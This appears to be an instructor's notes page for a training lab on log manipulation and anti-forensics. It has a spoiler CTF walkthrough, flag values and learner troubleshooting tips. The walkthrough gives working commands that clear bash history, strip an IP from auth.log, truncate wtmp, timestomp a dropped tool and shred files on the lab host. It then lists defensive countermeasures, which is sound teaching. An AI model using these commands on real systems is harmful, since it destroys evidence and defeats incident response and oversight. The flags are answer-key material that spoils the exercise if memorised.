---
title: "Lab 11 Notes: Log Manipulation & Anti-Forensics"
---

## CTF walkthrough (spoiler)

The episode's optional CTF challenge gives two starting flags immediately
(root access is granted for this lab, so the challenge isn't about getting
in) and then asks learners to generate evidence of their activity, erase or
falsify every trace of it, and pass all four checks in `verify.sh` for a
bonus flag.

### Starting flags

```bash
ssh root@10.10.11.10
# password: toor123
cat user.txt   # flag{lab11_root_access_given}
cat root.txt   # flag{lab11_full_control_granted}
```

### Generate evidence, then erase it

```bash
# From lab11-attacker
sshpass -p wrongpass ssh -o StrictHostKeyChecking=no root@10.10.11.10 whoami 2>&1 || true
ssh root@10.10.11.10
# ... do stuff, then:
exit
```

```bash
ssh root@10.10.11.10
unset HISTFILE
history -c
> ~/.bash_history

sed -i '/10.10.11.2/d' /var/log/auth.log

> /var/log/wtmp

touch -r /root/legit_reference.txt /root/dropped_tool.sh

echo "notes" > /root/scratch.txt
shred -u /root/scratch.txt

bash /root/verify.sh
```

### Bonus flag

If all four checks in `verify.sh` pass:

```
flag{lab11_covered_all_tracks}
```

### Lesson to reinforce

Every one of these techniques has a direct defensive countermeasure:
centralized/remote logging (so a compromised host can't edit the copy that
matters), file integrity monitoring (so timestomping and silent edits get
flagged), and auditd rules that are harder to fully suppress than syslog.
Covering tracks against a well-defended environment is much harder than
against this lab's single local log file — that gap is the point of the
exercise.

## Common sticking points

- Exercise 0.1's final `exit` is easy to skip past, but it's load-bearing —
  bash only flushes history to disk on a normal session exit, so if a
  learner kills the session (closes the terminal, `docker exec` drops) or
  runs `unset HISTFILE` too early, Exercise 1.1 will show an empty history
  and Part 1 won't make sense. Have them repeat Exercise 0.1 with a clean
  `exit` if that happens.
- `verify.sh`'s bash-history check looks at `/root/.bash_history`
  specifically — if a learner's `$HOME` or `HISTFILE` got redirected
  earlier in the session, `> ~/.bash_history` may not truncate the same
  file the checker inspects. Have them confirm with `echo $HISTFILE` if
  Exercise 6.1's history check unexpectedly fails.
- The wtmp check in `verify.sh` counts *any* remaining `last -f
  /var/log/wtmp` entries, so a learner who re-logs-in after truncating
  `wtmp` (e.g. to double check Exercise 3.2 worked) will reintroduce a
  fresh login record and fail Part 6 until they clear it again — this is
  expected behavior, not a bug, and is a good moment to point out that
  cleanup has to be the *last* thing done, in order.
